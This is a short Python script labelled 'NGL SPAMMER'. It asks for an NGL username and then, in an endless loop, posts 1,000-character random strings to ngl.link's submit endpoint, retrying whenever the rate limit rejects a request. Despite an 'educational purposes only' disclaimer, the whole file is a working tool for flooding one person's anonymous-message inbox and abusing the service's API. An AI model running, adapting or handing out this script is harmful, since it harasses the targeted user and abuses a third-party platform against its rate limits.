import requests
import random
import string
import os
from colorama import Fore, Back, Style # Just colored text, not important

os.system("cls")
url = "https://ngl.link/api/submit" # ngl api

print("""
 /$$   /$$  /$$$$$$  /$$              /$$$$$$  /$$$$$$$   /$$$$$$  /$$      /$$ /$$      /$$ /$$$$$$$$ /$$$$$$$ 
| $$$ | $$ /$$__  $$| $$             /$$__  $$| $$__  $$ /$$__  $$| $$$    /$$$| $$$    /$$$| $$_____/| $$__  $$
| $$$$| $$| $$  \__/| $$            | $$  \__/| $$  \ $$| $$  \ $$| $$$$  /$$$$| $$$$  /$$$$| $$      | $$  \ $$
| $$ $$ $$| $$ /$$$$| $$            |  $$$$$$ | $$$$$$$/| $$$$$$$$| $$ $$/$$ $$| $$ $$/$$ $$| $$$$$   | $$$$$$$/
| $$  $$$$| $$|_  $$| $$             \____  $$| $$____/ | $$__  $$| $$  $$$| $$| $$  $$$| $$| $$__/   | $$__  $$
| $$\  $$$| $$  \ $$| $$             /$$  \ $$| $$      | $$  | $$| $$\  $ | $$| $$\  $ | $$| $$      | $$  \ $$
| $$ \  $$|  $$$$$$/| $$$$$$$$      |  $$$$$$/| $$      | $$  | $$| $$ \/  | $$| $$ \/  | $$| $$$$$$$$| $$  | $$
|__/  \__/ \______/ |________/       \______/ |__/      |__/  |__/|__/     |__/|__/     |__/|________/|__/  |__/
      
IMPORTANT: The script is for educational purposes only and use of the script is at your own risk.

Username is the ending of the NGL link:
ngl.link/USERNAME
      """)

_username = input("Username: ").lower()
input("Press ENTER to send spam...")

while True: # starting fast then being slow because of the rate limit
    _question = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(1000))
    data = {
    "username": _username,
    "question": _question,
    "deviceId": "",
    "gameSlug": "",
    "referrer": ""
    } # format of the request which is being sent to ngl server

    response = requests.post(url, data=data)

    if response.status_code == 200:
        print(Fore.GREEN + f"Request sent to @{_username}" + Style.RESET_ALL)
    else:
        continue # continues because sending request failed (mostly because of the lot of requests sent in the moment)
